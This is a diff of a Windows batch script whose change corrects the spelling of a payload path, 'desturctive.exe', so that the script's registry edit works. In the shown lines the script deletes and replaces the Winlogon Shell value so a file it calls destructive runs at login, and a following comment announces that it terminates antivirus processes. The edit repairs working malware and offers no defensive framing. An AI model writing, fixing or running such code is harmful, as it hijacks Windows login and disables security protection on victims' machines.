@@ -221,7 +221,7 @@ if %errorlevel% == 0 (
 :: Modify Shell registry to run destructive file
 echo Modifying registry to set Shell value...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Program Files\utkudrk2\desturctive.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Program Files\utkudrk2\destructive.exe" /f
 
 :: Kill antivirus processes
 echo Terminating antivirus processes...
